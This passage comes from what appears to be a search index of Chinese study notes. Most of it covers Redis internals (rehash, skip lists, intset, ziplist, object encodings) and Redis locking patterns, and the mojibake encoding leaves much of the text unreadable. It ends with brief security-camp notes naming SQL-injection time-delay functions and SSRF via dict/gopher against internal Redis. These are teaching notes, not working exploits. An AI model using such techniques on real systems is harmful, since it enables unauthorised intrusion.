æ—¶é—´è¿›è¡Œ rehashã€‚\n  /* Rehash in ms+\u0026#34;delta\u0026#34; milliseconds. The value of \u0026#34;delta\u0026#34; is larger * than 0, and is smaller than 1 in most cases. The exact upper bound * depends on the running time of dictRehash(d,100).*/ int dictRehashMilliseconds(dict *d, int ms) {  if (d-\u0026gt;pauserehash \u0026gt; 0) return 0;  long long start = timeInMilliseconds();  int rehashes = 0;  while(dictRehash(d,100)) {  rehashes += 100;  if (timeInMilliseconds()-start \u0026gt; ms) break;  }  return rehashes; }  _dictRehashStepï¼šå¯¹å•æ­¥è¿ç§»æ“ä½œçš„å°è£…ã€‚\nè¯¥å‡½æ•°åœ¨æ·»åŠ åˆ é™¤æŸ¥æ‰¾ç­‰æ–¹æ³•è¢«æ‰§è¡Œæ—¶ä¼šç”¨åˆ°ï¼Œæˆ‘æ„Ÿè§‰è¿™ä¹ˆåšçš„å¥½å¤„æ˜¯å¯ä»¥å°†è®¡ç®—å‹åŠ›åˆ†æ‘Šåˆ°æ¯æ¬¡è®¿é—®è¯·æ±‚ä¸­ï¼Œè€ŒåŸºæœ¬ä¸ä¼šå½±å“æ¯æ¬¡è®¿é—®çš„æŸ¥è¯¢é€Ÿåº¦ã€‚åŒæ—¶é—´æ¥åœ°å®ç°äº†â€œè¶Šè¢«é¢‘ç¹ä½¿ç”¨çš„å­—å…¸ï¼Œè®¡ç®—ä¼˜å…ˆçº§è¶Šé«˜â€ï¼›\u0010\n  PSï¼šç¾å›¢æŠ€æœ¯å›¢é˜Ÿé’ˆå¯¹ Redis-Rehash è¿™ä¸€æ–¹å‘è¿›è¡Œäº†ä¼˜åŒ–ï¼šhttps://tech.meituan.com/2018/07/27/redis-rehash-practice-optimization.html\nzipmap #  zipmap åå­—å« zipï¼Œå®é™…ä¸Šå¹¶æ²¡æœ‰è¿›è¡Œå‹ç¼©æ“ä½œï¼Œå®ƒå°†é”®å€¼å¯¹è¿ç»­å­˜å‚¨ï¼Œçœå»äº†è®¸å¤šç®¡ç† map çš„æŒ‡é’ˆç»“æ„ï¼Œå®ƒçš„å¤§è‡´ç»“æ„å¯ä»¥åœ¨ zipmapNew è¿™ä¸ªå‡½æ•°ä¸­çœ‹åˆ°ï¼š\nunsigned char *zipmapNew(void) {  unsigned char *zm = zmalloc(2);   zm[0] = 0; /* Length */  zm[1] = ZIPMAP_END;  return zm; } è·³è·ƒè¡¨ (Skip List) #   è·³è·ƒè¡¨æœ€åˆåœ¨è®ºæ–‡ã€ŠSkip Lists: A Probabilistic Alternative to Balanced Treesã€‹ä¸­æå‡ºï¼Œåœ¨ Redis ä¸­çš„ä½¿ç”¨æ˜¯è¿™ä¸ªæ•°æ®ç»“æ„çš„é«˜å…‰æ—¶åˆ»ã€‚\n Redis ä¸­çš„å®ç° #  è·³è·ƒè¡¨å®šä¹‰åœ¨ server.h è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œå®ƒæ˜¯æœ‰åºé›†åˆçš„åº•å±‚å®ç°ä¹‹ä¸€ã€‚\nè·³è·ƒè¡¨æœ¬èº«çš„å®ç°ç»“æ„åç§°ä¸º zskiplistï¼š\ntypedef struct zskiplist {  struct zskiplistNode *header, *tail;  unsigned long length;  int level; } zskiplist; å…¶ä¸­ zskiplistNode ä¸»è¦ç”± å­—ç¬¦å€¼ã€åˆ†å€¼ã€å¤šå±‚è·³è·ƒæŒ‡é’ˆ ä¸‰ä¸ªéƒ¨åˆ†æ„æˆï¼š\ntypedef struct zskiplistNode {  sds ele;  double score;  struct zskiplistNode *backward;  struct zskiplistLevel {  struct zskiplistNode *forward;  unsigned long span;  } level[]; } zskiplistNode; å®Œç¾çš„è·³è·ƒè¡¨å¯ä»¥å®ç° O(log n) çš„æŸ¥æ‰¾æ—¶é—´å¤æ‚åº¦ã€‚\nå‚æ•° p #  è·³è·ƒè¡¨çš„å®ç°æœ‰ä¸€ä¸ªå…³é”®å‚æ•° pï¼Œåœ¨ Redis ä¸­å®ƒè¢«å®šä¹‰ä¸ºé»˜è®¤å€¼ 1/4ï¼š\n#define ZSKIPLIST_P 0.25 /* Skiplist P = 1/4 */å®ƒæœ‰ä»¥ä¸‹çš„å«ä¹‰ï¼š\n åœ¨å®ç°è·³è·ƒè¡¨çš„ç¨‹åºä¸­ï¼Œå®ƒè¡¨å¾æ–°æ’å…¥çš„å…ƒç´ æ˜¯å¦è¦æ–°åŠ ä¸€å±‚çš„æ¦‚ç‡ã€‚è¿™ä¹Ÿå°±æ˜¯è¯´ï¼š  ä¸€ä¸ªæ–°æ’å…¥çš„å…ƒç´ æœ‰ä¸€å±‚è·³è·ƒæŒ‡é’ˆæ¦‚ç‡ä¸º pï¼Œä¸¤å±‚çš„æ¦‚ç‡ä¸º $p^2$ï¼Œåæ˜¯ $p^3$ï¼›   ç¬¬ x+1 å±‚æŒ‡é’ˆæ•°é‡çš„æ•°å­¦æœŸæœ›ï¼Œä¸ç¬¬ x å±‚æŒ‡é’ˆæ•°é‡çš„æ•°å­¦æœŸæœ›ï¼Œçš„æ¯”ï¼›  æŸ¥æ‰¾æ—¶é—´å¤æ‚åº¦ #  è®¾å‡½æ•° f(x) ä¸ºï¼šé•¿åº¦ä¸º n çš„è·³è·ƒè¡¨åœ¨æŸ¥æ‰¾ç¬¬ x é¡¹æ—¶éœ€è¦ç»è¿‡çš„æ€»è·¯å¾„æ•°é‡ã€‚\né‚£ä¹ˆå®¹æ˜“å¾—åˆ°æ–¹ç¨‹ï¼š\n $\\displaystyle f(x) = f(px) + \\frac{1}{2p}$  å…¶ä¸­ï¼Œå› ä¸ºè¿™ä¸ªå·®å€¼æ˜¯ä¸€ä¸ªä»‹äº 0 ä¸ $\\displaystyle \\frac{1}{p}$ ä¹‹é—´å‡åŒ€åˆ†å¸ƒçš„å˜é‡ï¼Œæ‰€ä»¥æœŸæœ›æ˜¯ $\\displaystyle \\frac{1}{2p}$ã€‚\nå› ä¸º p\u0026lt;1ï¼Œæ‰€ä»¥ï¼š\n $\\displaystyle \\lim_{i \\rightarrow +\\infin} f(p^{i}x) = f(0) = 0$  å…¶ä¸­ $f(0) = 0$ ï¼Œè¡¨ç¤ºå¦‚æœè¦æŸ¥æ‰¾çš„å…ƒç´ ä½äºç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œåˆ™ä¸éœ€è¦è¿›è¡Œä»»ä½•çš„æŸ¥æ‰¾æ“ä½œã€‚\nå› æ­¤å¯¹ä¸Šé¢çš„æ–¹ç¨‹è¿›è¡Œè¿­ä»£ï¼Œåœ¨é•¿åº¦ä¸º n çš„è·³è·ƒè¡¨ä¸­ï¼Œæœ€é«˜å±‚æ•°ä¸º $log_{\\frac{1}{p}} n$ï¼Œæ‰€ä»¥å¯ä»¥å¾—åˆ°è¿™ä¸ªå‡½æ•°æ–¹ç¨‹çš„è§£ï¼š\n $\\displaystyle f(x) = 0 + \\frac{1}{2p} * log_{\\frac{1}{p}}n = - \\frac{ln(n)}{2p * ln(p)}$  å¯¹åˆ†æ¯æ±‚å¯¼å¯ä»¥å¾—åˆ°ï¼Œè€ƒè™‘æ—¶é—´å¤æ‚åº¦æ—¶çš„æœ€åˆé€‚çš„ p æ˜¯ $\\displaystyle \\frac{1}{e}$ã€‚\næœŸæœ›ç©ºé—´å¤æ‚åº¦ #  æ ¹æ® zskiplistNode çš„ç»“æ„ï¼Œæˆ‘ä»¬åŸºæœ¬å¯ä»¥è®¤ä¸ºä¸€ä¸ª node çš„å¤§å°è·Ÿä¸€ä¸ª level çš„å¤§å°æ˜¯ç›¸åŒçš„ï¼Œæˆ‘ä»¬è®¾è¿™ä¸ªå¤§å°ä¸ºå•ä½ 1ï¼Œäºæ˜¯å¯ä»¥å¾—åˆ°ç©ºé—´å¤æ‚åº¦è®¡ç®—æ–¹ç¨‹ï¼š\n $\\displaystyle Size = n + np + np^2 + \\dots + n p^{log_{\\frac{1}{p}} n}$  ä¹˜ p åšå·®å¯å¾—ï¼š\n $\\displaystyle Size = \\frac{1}{1 - p} *(n - n * n^{-1} * p) = \\frac{n - p}{1- p}$  å¯è§ p äºåŒºé—´ 0-1 å†…ï¼Œä¸ Size æ˜¯æˆæ­£æ¯”å…³ç³»çš„ï¼Œæ‰€ä»¥åœ¨è€ƒè™‘ $\\frac{1}{2}$ ä¸ $\\frac{1}{4}$ è¿™ä¸¤ä¸ªç†è®ºå®è·µå¤æ‚åº¦æ—¶é—´å–å€¼ä¸­ï¼ŒRedis é€‰æ‹©äº† $\\frac{1}{4}$ã€‚\næ•´æ•°é›†åˆï¼ˆInteger Setï¼‰ #  æ•´æ•°é›†åˆå®šä¹‰åœ¨ intset.c ä¸ inset.h è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­ï¼Œå®ƒæ˜¯ç”¨äºä¿å­˜æ•´æ•°å€¼çš„é›†åˆæŠ½è±¡æ•°æ®ç»“æ„ï¼šå³å®ƒä¿å­˜å†…å®¹ä¸ºæ•´æ•°å€¼ï¼Œå¹¶ä¸”é›†åˆå†…ä¸ä¼šå‡ºç°é‡å¤å…ƒç´ ã€‚å®ƒæ˜¯é›†åˆé”®çš„åº•å±‚å®ç°ä¹‹ä¸€ã€‚\nç»“æ„ #  intset çš„ç»“æ„å®šä¹‰ç›¸å½“ç®€å•ï¼š\ntypedef struct intset {  uint32_t encoding;  uint32_t length;  int8_t contents[]; } intset; å…¶ä¸­ encoding å¯ä»¥è®¤ä¸ºæ˜¯é«˜çº§è¯­è¨€ä¸­çš„æšä¸¾å€¼ï¼Œå®ƒå®šä¹‰åœ¨ intset.c æ–‡ä»¶ä¸­ï¼š\n#define INTSET_ENC_INT16 (sizeof(int16_t)) #define INTSET_ENC_INT32 (sizeof(int32_t)) #define INTSET_ENC_INT64 (sizeof(int64_t)) contents å®é™…å­˜å‚¨çš„æ•°æ®ç±»å‹ç”±è¿™ä¸ª encoding å†³å®šï¼Œå®ƒä¼šåœ¨è®¿é—®æ—¶è¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬åŒ–ã€‚\nå‡çº§ #  é€šè¿‡ä¸åŒçš„ encoding å­˜å‚¨æœ‰ä»¥ä¸‹å¥½å¤„ï¼š\n æå‡çµæ´»æ€§ï¼Œå› ä¸º C è¯­è¨€çš„ç‰¹æ€§ï¼Œä¸èƒ½ç”¨ä¸€ä¸ªç»“æ„åŒæ—¶å­˜å‚¨å¤šä¸ªç±»å‹çš„æ•°æ®ï¼› èŠ‚çº¦å†…å­˜ï¼Œä¸éœ€è¦ä¸ºäº†å¤§é‡å°æ•°å­—å¼€è¾Ÿå¤§é‡é«˜ä½å†…å­˜ï¼›  ä½†æ˜¯å› ä¸º inset çš„å†…å®¹ä¼šåŠ¨æ€å˜åŒ–ï¼Œåœ¨ä¸€äº›åœºæ™¯ä¸‹ä¼šè§¦å‘å‡çº§ï¼ˆencoding ä»å°çš„ç±»å‹è½¬å˜ä¸ºå¤§çš„ç±»å‹ï¼‰ã€‚\nå‡çº§ï¼šintsetUpgradeAndAddï¼Œåœ¨æ’å…¥ä¸€ä¸ªæ¯”ç±»å‹å€¼è¿˜å¤§çš„æ•°å­—æ—¶ä¼šè§¦å‘å‡çº§ã€‚å‡½æ•°ç­¾åï¼š\n/* Upgrades the intset to a larger encoding and inserts the given integer. */ static intset *intsetUpgradeAndAdd(intset *is, int64_t value) PSï¼šä¸ºä»€ä¹ˆ inset ä¸åƒ hashtable è®¾è®¡ä¸€ä¸ªæ¸è¿›æ€§çš„å‡çº§æ–¹æ¡ˆã€‚\nå‹ç¼©åˆ—è¡¨ï¼ˆZip Listï¼‰ #  å‹ç¼©åˆ—è¡¨æ˜¯ä¸ºäº†èŠ‚çº¦å†…å­˜è€Œè¯ç”Ÿçš„ä¸€ç§æ•°æ®ç»“æ„ï¼Œå®ƒçš„æœ¬è´¨æ˜¯ä¸€ä¸ªé€šè¿‡ç‰¹æ®Šç¼–ç æ–¹å¼å­˜å‚¨çš„åŒå‘é“¾è¡¨ã€‚\nå½“ä¸€ä¸ªåˆ—è¡¨å€¼ä¸­åªåŒ…å«å°‘é‡çš„åˆ—è¡¨é¡¹ï¼Œå¹¶ä¸”æ¯ä¸ªåˆ—è¡¨é¡¹è¦ä¹ˆå°±æ˜¯å°çš„æ•´æ•°å€¼ï¼Œè¦ä¹ˆå°±æ˜¯æ¯”è¾ƒçŸ­çš„å­—ç¬¦ä¸²ã€‚é‚£ä¹ˆRedis åº•å±‚å°±æ˜¯ä½¿ç”¨å‹ç¼©åˆ—è¡¨æ¥åšåˆ—è¡¨é”®çš„åº•å±‚å®ç°ã€‚\nç»“æ„ #  å‹ç¼©åˆ—è¡¨çš„è¯¦ç»†æ•°æ®ç»“æ„åœ¨æºä»£ç çš„ ziplist.c æ–‡ä»¶å¼€å¤´æœ‰é•¿è¾¾ 200 è¡Œçš„æ³¨é‡Šè§£é‡Šï¼Œå¤§ä½“æ¦‚æ‹¬å°±æ˜¯ä¸‹é¢çš„ç»“æ„ï¼š\n\u0026lt;zlbytes\u0026gt; \u0026lt;zltail\u0026gt; \u0026lt;zllen\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;entry\u0026gt; ... \u0026lt;entry\u0026gt; \u0026lt;zlend\u0026gt; å…¶ä¸­ï¼š\n zlbytes æŒ‡æ˜äº†åŒ…æ‹¬å®ƒè‡ªå·±åœ¨å†…çš„æ•´ä¸ª ziplist å­—èŠ‚å¤§å°ï¼› zltail æŒ‡æ˜äº†æœ€åä¸€ä¸ª entry çš„ç›¸å¯¹åç§»ï¼› zllen æŒ‡æ˜äº†æ•°ç»„é•¿åº¦å¤§å°ï¼Œå³ä¹‹åè·Ÿçš„ entry çš„æ•°é‡ï¼› zlend æ˜¯ä¸€ä¸ªè¡¨å¾å‹ç¼©åˆ—è¡¨ç»“å°¾çš„å­—èŠ‚ï¼Œå›ºå®šçš„å€¼ 0xFFï¼›  entry çš„å†…éƒ¨ä¹Ÿæœ‰è®¸å¤šé€šè¿‡ç¼–ç é™ä½å†…å­˜çš„è®¾è®¡ï¼Œå¤§ä½“æ¦‚è¿°å°±æ˜¯ä¸‹é¢çš„ç»“æ„ï¼š\n\u0026lt;prevlen\u0026gt; \u0026lt;encoding\u0026gt; \u0026lt;entry-data\u0026gt; åœ¨ä¸åŒçš„æƒ…å†µä¸‹ï¼Œè¿™ä¸€åŸºæœ¬ç»“æ„æœ‰ä¸åŒçš„å˜ä½“ã€‚\næ¯”å¦‚å¯¹äºå°æ•´æ•°ï¼Œencodingï¼Œè‡ªèº«å°±å¯ä»¥è¡¨ç¤ºæ•°å€¼ï¼Œæ­¤æ—¶çš„ç»“æ„ä¸ºï¼š\n\u0026lt;prevlen\u0026gt; \u0026lt;encoding\u0026gt; prevlen é€šå¸¸åªç”¨ä¸€ä¸ªå­—èŠ‚è¡¨ç¤ºï¼Œå¦‚æœé•¿åº¦å¤§äºç­‰äº 254ï¼Œåˆ™ç¬¬ä¸€ä¸ªå­—èŠ‚ç½®ä½ä¸º 0xFEï¼š\n0xFE \u0026lt;4 bytes unsigned little endian prevlen\u0026gt; \u0026lt;encoding\u0026gt; \u0026lt;entry\u0026gt; æ“ä½œ #  å‹ç¼©åˆ—è¡¨æ˜¯ä¸€ä¸ªâ€œæ—¶é—´æ¢ç©ºé—´â€çš„è®¾è®¡ï¼Œæ‰€ä»¥åªèƒ½ç”¨äºå°åˆ—è¡¨é¡¹ã€‚\n  ä¸‹æ ‡è®¿é—®ã€entry å‰æŒ‡ã€entry åæŒ‡ã€è·å–å­—èŠ‚æ•°ã€è·å–åˆ—è¡¨å¤§å°ç­‰æŸ¥è¯¢æ“ä½œéƒ½æ˜¯ O(1)ï¼›\n  æ’å…¥ã€åˆ é™¤ç­‰æ¶‰åŠåˆ°å¤§å°å˜åŒ–çš„æ›´æ–°æ“ä½œæ—¶é—´å¤æ‚åº¦éƒ½æ˜¯å¹³å‡ O(N)ï¼›\n  æ’å…¥ã€åˆ é™¤å¯èƒ½ä¼šå¼•å‘è¿é”æ›´æ–°ï¼Œæ‰€ä»¥æœ€åçš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(N^2)\n  ä»€ä¹ˆæ˜¯è¿é”æ›´æ–°ï¼Ÿ\n å½“ ziplist ä¿å­˜äº†å¤§é‡é•¿åº¦ä¸º 253 é•¿åº¦çš„ entry æ—¶ï¼Œå¦‚æœåœ¨ç¬¬ä¸€ä¸ªä½ç½®æ’å…¥äº†ä¸€ä¸ªé•¿åº¦å¤§äº 253 çš„å…ƒç´ ï¼Œåˆ™ä¼šå¯¼è‡´ä¹‹åçš„æ¯ä¸€ä¸ª entry æ‰§è¡Œè¿é”æ›´æ–°ï¼Œæ—¶é—´å¤æ‚åº¦ O(N^2)  å¯¹è±¡ #  Redis æš´éœ²ç»™ç”¨æˆ·çš„å¹¶ä¸æ˜¯ä¸Šé¢åˆ—ä¸¾çš„è¿™äº›â€œåŸºæœ¬æ•°æ®ç»“æ„â€ï¼Œè€Œæ˜¯äº”ä¸ªå¯¹è±¡ï¼š\n å­—ç¬¦ä¸²å¯¹è±¡ï¼ˆæ— å‰ç¼€ï¼‰ã€åˆ—è¡¨å¯¹è±¡ (l)ã€å“ˆå¸Œå¯¹è±¡ (h)ã€é›†åˆå¯¹è±¡ (s)ã€æœ‰åºé›†åˆå¯¹è±¡ (z)ï¼›  Redis é€šè¿‡ä¸åŒçš„ç¼–ç æ–¹å¼è¡¨å¾å…·ä½“çš„åº•å±‚å®ç°ã€‚\nç»“æ„ #  redisObject å£°æ˜åœ¨æ–‡ä»¶ rio.h ä¸­ï¼Œå®é™…å®šä¹‰åœ¨ server.c ä¸­ï¼š\ntypedef struct redisObject {  unsigned type:4;  unsigned encoding:4;  unsigned lru:LRU_BITS; /* LRU time (relative to global lru_clock) or * LFU data (least significant 8 bits frequency * and most significant 16 bits access time). */  int refcount;  void *ptr; } robj; å…¶ä¸­ type å°±æ˜¯åœ¨å‰é¢åˆ—ä¸¾çš„äº”ä¸ªåŸºæœ¬æ•°æ®ç±»å‹ï¼š\n/* The actual Redis Object */ #define OBJ_STRING 0 /* String object. */#define OBJ_LIST 1 /* List object. */#define OBJ_SET 2 /* Set object. */#define OBJ_ZSET 3 /* Sorted set object. */#define OBJ_HASH 4 /* Hash object. */ç¼–ç  #  encoding è¡¨å¾è¿™è¿™ä¸ªç±»å‹çš„å¯¹è±¡åº•å±‚ä½¿ç”¨çš„æ•°æ®ç»“æ„ï¼Œé€šå¸¸ä¸€ä¸ªç±»å‹åªä¼šä½¿ç”¨ä¸¤ä¸ªåº•å±‚æ•°æ®ç»“æ„ï¼š\n/* Objects encoding. Some kind of objects like Strings and Hashes can be * internally represented in multiple ways. The \u0026#39;encoding\u0026#39; field of the object * is set to one of this fields for this object. */ #define OBJ_ENCODING_RAW 0 /* Raw representation */#define OBJ_ENCODING_INT 1 /* Encoded as integer */#define OBJ_ENCODING_HT 2 /* Encoded as hash table */#define OBJ_ENCODING_ZIPMAP 3 /* Encoded as zipmap */#define OBJ_ENCODING_LINKEDLIST 4 /* No longer used: old list encoding. */#define OBJ_ENCODING_ZIPLIST 5 /* Encoded as ziplist */#define OBJ_ENCODING_INTSET 6 /* Encoded as intset */#define OBJ_ENCODING_SKIPLIST 7 /* Encoded as skiplist */#define OBJ_ENCODING_EMBSTR 8 /* Embedded sds string encoding */#define OBJ_ENCODING_QUICKLIST 9 /* Encoded as linked list of ziplists */#define OBJ_ENCODING_STREAM 10 /* Encoded as a radix tree of listpacks */å…·ä½“åˆ°äº”ä¸ªå¯¹è±¡ï¼š\n å­—ç¬¦ä¸²å¯¹è±¡ï¼šintã€rawã€embstrï¼› åˆ—è¡¨å¯¹è±¡ï¼šziplistã€linkedlistï¼›3.2 å quicklist æˆä¸ºå…¶å”¯ä¸€ç¼–ç æ¨¡å¼ï¼› å“ˆå¸Œå¯¹è±¡ï¼šziplistã€hashtableï¼› é›†åˆå¯¹è±¡ï¼šintsetã€hashtableï¼› æœ‰åºé›†åˆå¯¹è±¡ï¼šziplistã€skiplistï¼›  å†…å­˜ç®¡ç† #  é’ˆå¯¹äºå¯¹è±¡ï¼ŒRedis ä½¿ç”¨â€œå¼•ç”¨è®¡æ•°â€çš„å†…å­˜å›æ”¶æœºåˆ¶ï¼Œå¹¶ä¸º 0-10000 è¿™äº›æ•°å­—è®¾ç½®äº†é»˜è®¤çš„å¯¹è±¡å…±äº«ã€‚\n"},{"id":203,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/2.%E5%8D%95%E6%9C%BA%E6%95%B0%E6%8D%AE%E5%BA%93/","title":"2.å•æœºæ•°æ®åº“","section":"Redis","content":"mixin #  æ¦‚å¿µ #  Mixin è¿™ä¸ªæ¦‚å¿µæœ¬èº«æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œå®ƒæŒ‡ä¸€ä¸ªç±»ä¸é€šè¿‡ç»§æ‰¿çš„æ–¹å¼è·å¾—å¦ä¸€ä¸ªç±»çš„æ‰€æœ‰æ–¹æ³•ä¸å±æ€§ï¼Œå®ƒé€šå¸¸å¯ä»¥ç”¨äºè§£å†³åœ¨ä¸èƒ½å®ç°å¤šç»§æ‰¿çš„è¯­è¨€ï¼ˆTypeScript å°±æ˜¯è¿™æ ·ä¸€ä¸ªåªæ”¯æŒå•ç»§æ‰¿çš„è¯­è¨€ï¼‰ä¸­å®ç°å¤šç»§æ‰¿ã€‚\nTypeScript #  "},{"id":204,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/redis%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/%E9%94%81%E5%AE%9E%E7%8E%B0/","title":"é”å®ç°","section":"Redis","content":" å‚è€ƒï¼š\n https://www.jianshu.com/p/81b0f1bd1328   Redis å®ç°é”æœºåˆ¶ #  ç¬¬ä¸€ç§é”å‘½ä»¤ INCR #  è¿™ç§åŠ é”çš„æ€è·¯æ˜¯ï¼Œ key ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆ key çš„å€¼ä¼šå…ˆè¢«åˆå§‹åŒ–ä¸º 0 ï¼Œç„¶åå†æ‰§è¡Œ INCR æ“ä½œè¿›è¡ŒåŠ ä¸€ã€‚\nç„¶åå…¶å®ƒç”¨æˆ·åœ¨æ‰§è¡Œ INCR æ“ä½œè¿›è¡ŒåŠ ä¸€æ—¶ï¼Œå¦‚æœè¿”å›çš„æ•°å¤§äº 1 ï¼Œè¯´æ˜è¿™ä¸ªé”æ­£åœ¨è¢«ä½¿ç”¨å½“ä¸­ã€‚\n 1ã€ å®¢æˆ·ç«¯Aè¯·æ±‚æœåŠ¡å™¨è·å–keyçš„å€¼ä¸º1è¡¨ç¤ºè·å–äº†é”  2ã€ å®¢æˆ·ç«¯Bä¹Ÿå»è¯·æ±‚æœåŠ¡å™¨è·å–keyçš„å€¼ä¸º2è¡¨ç¤ºè·å–é”å¤±è´¥  3ã€ å®¢æˆ·ç«¯Aæ‰§è¡Œä»£ç å®Œæˆï¼Œåˆ é™¤é”  4ã€ å®¢æˆ·ç«¯Båœ¨ç­‰å¾…ä¸€æ®µæ—¶é—´ååœ¨å»è¯·æ±‚çš„æ—¶å€™è·å–keyçš„å€¼ä¸º1è¡¨ç¤ºè·å–é”æˆåŠŸ  5ã€ å®¢æˆ·ç«¯Bæ‰§è¡Œä»£ç å®Œæˆï¼Œåˆ é™¤é”   $redis-\u0026gt;incr($key);  $redis-\u0026gt;expire($key, $ttl); //è®¾ç½®ç”Ÿæˆæ—¶é—´ä¸º1ç§’ ç¬¬äºŒç§é” SETNX #  è¿™ç§åŠ é”çš„æ€è·¯æ˜¯ï¼Œå¦‚æœ key ä¸å­˜åœ¨ï¼Œå°† key è®¾ç½®ä¸º valueã€‚\nå¦‚æœ key å·²å­˜åœ¨ï¼Œåˆ™ SETNX ä¸åšä»»ä½•åŠ¨ä½œ\n 1ã€ å®¢æˆ·ç«¯Aè¯·æ±‚æœåŠ¡å™¨è®¾ç½®keyçš„å€¼ï¼Œå¦‚æœè®¾ç½®æˆåŠŸå°±è¡¨ç¤ºåŠ é”æˆåŠŸ  2ã€ å®¢æˆ·ç«¯Bä¹Ÿå»è¯·æ±‚æœåŠ¡å™¨è®¾ç½®keyçš„å€¼ï¼Œå¦‚æœè¿”å›å¤±è´¥ï¼Œé‚£ä¹ˆå°±ä»£è¡¨åŠ é”å¤±è´¥  3ã€ å®¢æˆ·ç«¯Aæ‰§è¡Œä»£ç å®Œæˆï¼Œåˆ é™¤é”  4ã€ å®¢æˆ·ç«¯Båœ¨ç­‰å¾…ä¸€æ®µæ—¶é—´ååœ¨å»è¯·æ±‚è®¾ç½®keyçš„å€¼ï¼Œè®¾ç½®æˆåŠŸ  5ã€ å®¢æˆ·ç«¯Bæ‰§è¡Œä»£ç å®Œæˆï¼Œåˆ é™¤é”   $redis-\u0026gt;setNX($key, $value);  $redis-\u0026gt;expire($key, $ttl); ç¬¬ä¸‰ç§é” SET #  ä¸Šé¢ä¸¤ç§æ–¹æ³•éƒ½æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œä¼šå‘ç°ï¼Œéƒ½éœ€è¦è®¾ç½® key è¿‡æœŸã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆè¦è®¾ç½®keyè¿‡æœŸå‘¢ï¼Ÿå¦‚æœè¯·æ±‚æ‰§è¡Œå› ä¸ºæŸäº›åŸå› æ„å¤–é€€å‡ºäº†ï¼Œå¯¼è‡´åˆ›å»ºäº†é”ä½†æ˜¯æ²¡æœ‰åˆ é™¤é”ï¼Œé‚£ä¹ˆè¿™ä¸ªé”å°†ä¸€ç›´å­˜åœ¨ï¼Œä»¥è‡³äºä»¥åç¼“å­˜å†ä¹Ÿå¾—ä¸åˆ°æ›´æ–°ã€‚\näºæ˜¯ä¹æˆ‘ä»¬éœ€è¦ç»™é”åŠ ä¸€ä¸ªè¿‡æœŸæ—¶é—´ä»¥é˜²ä¸æµ‹ã€‚ä½†æ˜¯å€ŸåŠ© Expire æ¥è®¾ç½®å°±ä¸æ˜¯åŸå­æ€§æ“ä½œäº†ã€‚æ‰€ä»¥è¿˜å¯ä»¥é€šè¿‡äº‹åŠ¡æ¥ç¡®ä¿åŸå­æ€§ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰äº›é—®é¢˜ï¼Œæ‰€ä»¥å®˜æ–¹å°±å¼•ç”¨äº†å¦å¤–ä¸€ä¸ªï¼Œä½¿ç”¨ SET å‘½ä»¤æœ¬èº«å·²ç»ä»ç‰ˆæœ¬ 2.6.12 å¼€å§‹åŒ…å«äº†è®¾ç½®è¿‡æœŸæ—¶é—´çš„åŠŸèƒ½ã€‚\n 1ã€ å®¢æˆ·ç«¯Aè¯·æ±‚æœåŠ¡å™¨è®¾ç½®keyçš„å€¼ï¼Œå¦‚æœè®¾ç½®æˆåŠŸå°±è¡¨ç¤ºåŠ é”æˆåŠŸ  2ã€ å®¢æˆ·ç«¯Bä¹Ÿå»è¯·æ±‚æœåŠ¡å™¨è®¾ç½®keyçš„å€¼ï¼Œå¦‚æœè¿”å›å¤±è´¥ï¼Œé‚£ä¹ˆå°±ä»£è¡¨åŠ é”å¤±è´¥  3ã€ å®¢æˆ·ç«¯Aæ‰§è¡Œä»£ç å®Œæˆï¼Œåˆ é™¤é”  4ã€ å®¢æˆ·ç«¯Båœ¨ç­‰å¾…ä¸€æ®µæ—¶é—´ååœ¨å»è¯·æ±‚è®¾ç½®keyçš„å€¼ï¼Œè®¾ç½®æˆåŠŸ  5ã€ å®¢æˆ·ç«¯Bæ‰§è¡Œä»£ç å®Œæˆï¼Œåˆ é™¤é”   $redis-\u0026gt;set($key, $value, array(\u0026#39;nx\u0026#39;, \u0026#39;ex\u0026#39; =\u0026gt; $ttl)); //exè¡¨ç¤ºç§’ "},{"id":205,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day12/","title":"Day12","section":"Xman3å¤ä»¤è¥","content":"æ¼æ´æŒ–æ˜ #  XSS #   XSSè‡ªåŠ¨åŒ–æŒ–æ˜ã€‚é‡ç‚¹åœ¨äºè¾“å…¥ä¸è¾“å‡ºã€‚  SQlæ³¨å…¥ #   Cookieã€headerã€urlã€è¯·æ±‚å‚æ•°ä¸­å‡æœ‰å¯èƒ½è§¦å‘ã€‚  PSï¼šmysqlå¸¸è§çš„å»¶æ—¶æ³¨å…¥çš„å‡½æ•°ï¼šsleepã€benchmarkï¼ˆé‡å¤æ‰§è¡ŒåŒä¸€ä¸ªå‡½æ•°ï¼‰   sqlæ³¨å…¥çš„å…³é”®ï¼šå¦‚ä½•é—­åˆsqlè¯­å¥  SSRFä¸URLè·³è½¬ #   å¤§éƒ¨åˆ†SSRFã€URLè·³è½¬æ¼æ´è§¦å‘åœ¨è¯·æ±‚å‚æ•°ä¸­ã€‚ redisæ˜¯æ”¯æŒå†…ç½‘çš„å¸¸è§æœåŠ¡ï¼Œå¯ä»¥åˆ©ç”¨dictä¸gopheråè®®ä¸ä¹‹é€šä¿¡ã€‚  "},{"id":206,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/xman3%E5%A4%8F%E4%BB%A4%E8%90%A5/day13/","title":"Day13","section":"Xman3å¤ä»¤è¥","content":"Httpsä¸‹çš„WebåŒæºå®‰å…¨é—®é¢˜ç ”ç©¶ #  XSS #  